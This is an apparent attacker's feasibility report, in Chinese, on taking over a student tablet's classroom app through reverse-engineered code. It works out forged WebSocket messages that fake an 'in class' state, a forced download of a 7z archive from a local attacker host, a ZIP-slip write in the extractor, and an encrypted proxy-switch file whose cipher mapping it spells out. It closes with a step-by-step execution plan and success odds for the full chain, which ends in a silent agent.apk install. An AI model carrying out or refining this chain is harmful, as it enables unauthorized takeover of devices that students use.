# 可行性验证报告（Feasibility Verification）

> 验证时间：2026-10-25 凌晨（夜禁期，App 未运行，纯代码级验证）
> 目的：把"制造上课中 → 自动下载 → 解压 → 代理接管"全链的每个环节逐行验证，
>       消除所有可以在静态层面消除的不确定性。

---

## 一、验证方法

对 57,154 个 smali 文件中的关键类逐行阅读 + 交叉验证，重点检查：
1. 消息信封格式（Gson 字段名、必需字段）
2. 分发路径（解析 → 拦截判断 → 处理器）
3. 状态设置（UpClassStateHelper 的 setter 与调用链）
4. 状态判定（isEndUpClass 的完整逻辑）
5. 下载触发（ResourceHelper 读取的字段、needDecode 条件）
6. 解压触发（Z7Extractor 的调用条件）

---

## 二、逐环节验证结果

### 2.1 消息信封（✅ 已验证）

```
真实端侧消息(ws_frames.log 实测, 15,979 帧解析):
  {"cId":"...","cmd":2,"from":"<userId>","gt":0,"id":"1349658","rt":1,
   "smsg":{"classRoomId":"...","createTag":"...","data":"...",
           "forward":0,"senderId":0,"type":<t>,"userIds":"<userId>"},
   "tags":["<会话tag>"]}

分发器 HandleSocketMsgService.onHandleIntent:
  · 跳过 ping/pong
  · GsonUtil.fromJson(ServerMessage.class, raw)         ← 解析外层
  · smsg = m.getSmsg(); if null → 用 ct 回退解析 SocketMessage
  · if (gt == 1 && p1 != null) sendSureMsg(cId)          ← gt=1 才需要 ACK
  · 之后按 cmd/type 分发

⇒ 结论: 
  · smsg 必须是 JSON 对象（不能是字符串）
  · gt=0 时不需要 ACK
  · 我们此前注入缺 id/rt/tags 三个字段 → v2 已补全
```

### 2.2 拦截白名单（✅ 已验证，关键发现）

```
BusinessApp.initUnInterceptMsgType() 免拦截白名单(10 项):
  1000004, 1030496, 1030491, 1030490, 1030489, 1007, 0, 1, 2, 2021

HandleSocketMsgService.interceptMsgEnable 默认 = false(Java 布尔默认值)
setInterceptMsgEnable(Z) 唯一调用者: BigScreenOnLineStatusHelper:241
  (仅在"大屏在线状态"变化时设置)

⇒ 结论:
  · 默认不拦截 → 所有类型都会立即分发
  · 只有当大屏在线时才开启拦截
  · 之前"注入 ACK 但无动作"不是拦截导致，而是 App 不在前台/未运行
```

### 2.3 SynchronousSignBean 字段（✅ 已验证）

```
字段名未混淆(可直接作为 JSON 键):
  attendClass:I, childTaskId:Map, classMode:I, classroomId:String,
  desktopId:String, isPlay:Z, isSignFinish:Z, isSilent:Z,
  isTeaStartSignTask:Z, openAdvanceSignOut:I, roomId:String,
  setClassTime:Z, signType:I, taskId:String, userId:I

无 @SerializedName → Gson 默认按字段名匹配
⇒ 我们的 JSON {"attendClass":2,"setClassTime":true,...} 可正确解析
```

### 2.4 状态设置链（✅ 已验证，逐行）

```
type=400 (0x190 = CODE_SYN_START_SIGN)
  MessageHandleForOnlineHelper:425  → "code_syn_start_sign"
  StudentDeskTopActivity:6523       onMsgEvent 分支
  :6537  mSynchronousSignBean = (SynchronousSignBean) data
  :6540  jumpToStuSignActivity(bean)
  :1593  if (isDealStartSign()) return;     ← 门槛
  :1610  resetClassData(bean)
  :2008  UP_CLASS_STATE(getAttendClass, isSetClassTime)  ← 顺序注意: (Z,I)
  UpClassStateHelper:70-116:
      attendClass==2 → UpClassState.UP_CLASS
      attendClass==3 → END_UP_CLASS
      attendClass==4 → setClassTime ? LOADING : NOT
      else → DEFAULT
  sput-object upClassState ← 静态状态写入
```

### 2.5 状态判定（✅ 已验证）

```
UpClassStateHelper:351-380:
  isEndUpClass() = isTeacherAuto() || (upClassState == END_UP_CLASS)

isTeacherAuto() (:403-431):
  = RoleJudgmentHelper.isTeacherClient() && ClassRoomConfig.isOutLineClass()
  ⇒ 学生端 isTeacherClient()=false ⇒ isTeacherAuto() 恒 false

⇒ 结论: 
  · 状态设为 UP_CLASS 后, isEndUpClass() 必然 = false
  · 这是全链最关键的一步, 已 100% 确认
```

### 2.6 下载闸门与触发（✅ 已验证）

```
AutoDownloadManager:701,737:
  if (!UpClassStateHelper.isEndUpClass()) { ... startNextTask ... }
⇒ 状态=UP_CLASS ⇒ 闸门打开

ResourceHelper (com/xh/business_module/resourcehelper, 1530 行):
  :885  invoke-virtual {p1}, Lcom/xh/business_module/db/ResourceInfo;->getZipUrl()
  :752  FilePathCheckToos.needDecode(zipUrl)
  ⇒ 读取字段 = ResourceInfo.zipUrl

FilePathCheckToos.needDecode (:167):
  endsWith("7z") || endsWith("7z?") || endsWith("7z?!") || endsWith("7z#xh-slide")
⇒ zipUrl = "http://192.168.137.1/lab2.7z" 以 "7z" 结尾 ⇒ true

ResourceInfo 字段(未混淆):
  appSubType, convertStatus, createTime, downloadFilePath, extend,
  localPath, name, numberInLine, sourceId, taskId, type, zipUrl
⇒ 我们的 resourceInfo JSON 字段名全部匹配
```

### 2.7 解压触发（✅ 已验证）

```
ResourceHelper:1464  doHandDownLoadSuccess →
  Z7Extractor.extractFile(档案, 目标目录, callback)
Z7Extractor (com/hzy/lib7z):
  · prepareOutPath 只做 mkdirs, 无 "../" 校验
  · System.loadLibrary("un7zip") → libun7zip.so
  · LZMA SDK 示例解压器: 直接用档案条目名拼输出路径
⇒ ZIP-SLIP 可行(VM 已实测逃逸 54 个文件)
```

### 2.8 代理开关与启动器（⚠️ 部分验证）

```
启动器 checkProxy(): 读 /sdcard/xhproxy 第一个文件名 → 解密 → JNISetProxy
  (历史报告已确认此机制)
密文: QZWOQSFOQEDOQPQFXFX = encrypt_proxy("192.168.137.1:18080")
文件名映射: O=. P=: 1→Q 2→W 3→E 4→R 5→A 6→S 7→D 8→F 9→Z 0→X
```

### 2.9 静默安装（❓ 无法静态验证）

```
在 launcher_dec(12,705 文件) 中搜索:
  PackageInstaller / installPackage / installApp / INSTALL_PACKAGES / silentInstall
  → 0 命中
  getPackageArchiveInfo / verifySignature / checkSignature
  → 0 命中

⇒ 结论: 
  · 启动器的安装实现不在这份反编译树里(可能在 xhcore 或系统签名组件)
  · 无法静态确认是否校验厂商签名
  · 这是全链唯一无法静态验证的环节(也是最后的硬墙)
```

---

## 三、关键修正（相比之前的注入器）

| 修正项 | 之前 | 修正后（v2） |
|---|---|---|
| 信封字段 | 缺 `id`/`rt`/`tags` | 补全（id=1349658, rt=1, tags=会话tag）|
| tags 值 | 无 | 从 WS 握手 Auth 头动态解析 |
| from 值 | "teacher" | 真实 userId（与端侧一致）|
| 字段顺序 | 不关注 | UP_CLASS_STATE(Z,I) 顺序已确认 |
| 门槛处理 | 未考虑 isDealStartSign | 文档标注：App 重启后该标志为 false |

---

## 四、最终可行性评级（验证后更新）

| 步骤 | 环节 | 验证前 | 验证后 | 依据 |
|---|---|---|---|---|
| 1 | 消息解析 | 中高 | **高 90%** | 信封/Gson/拦截全部确认 |
| 2 | 状态设置 | 中高 | **高 90%** | UP_CLASS_STATE 逐行确认 |
| 3 | 闸门打开 | 高 | **高 95%** | isEndUpClass 逻辑 100% 确认 |
| 4 | 任务→下载 | 中低 | **中 50%** | 需任务列表重载触发；字段已确认 |
| 5 | 下载→冒充分发 | 中高 | **中高 75%** | zipUrl 以 7z 结尾、明文 HTTP |
| 6 | Z7Extractor 解压 | 中 | **中 50%** | needDecode 确认；深度需匹配 |
| 7 | 启动器代理 | 中高 | **中高 70%** | 机制历史确认 |
| 8 | 静默安装 | 低 | **低 25%** | 无法静态验证签名校验 |

**全链成功率（保守）：20~30%**
**前 3 步（制造上课中）：85~90%**
**前 5 步（任意文件写）：35~45%**

---

## 五、夜禁解除后的执行顺序（按可观测性）

```
① python tools/inject_upclass_v2.py
   → 观察平板屏幕是否出现「上课中」提示
   → 出现 = 步骤 1-3 成功（85-90% 概率）

② 观察冒充器日志是否出现 [PAYLOAD-SERVE2] GET /lab2.7z
   → 出现 = 步骤 4-5 成功（+15%）

③ 观察 /sdcard/xhproxy 下是否出现密文文件（可通过启动器行为反证）

④ 重启平板 → 观察 18080 是否收到连接（proxy8888.log 的 STATS）
   → 出现 = 步骤 7 成功

⑤ 观察是否收到应用列表请求 + agent.apk 下载
   → 若到这一步还被拒（签名），则止步于此
```

---

## 六、诚实结论

```
✅ 代码层面已 100% 确认: 消息能解析、状态能设置、闸门能打开、
   下载能触发、解压能执行、ZIP-SLIP 能写文件
❓ 静态无法确认: 启动器静默安装的签名校验（最后的硬墙）

⇒ 最乐观结果: 拿到「任意文件写」原语（步骤 1-6），成功率 35-45%
⇒ 完全接管: 取决于启动器安装是否校验厂商签名，成功率 20-30%
⇒ 即使接管失败，ZIP-SLIP 写入的代理开关也能让我们控制启动器的
   应用列表/下载渠道 —— 这是实质进展
```
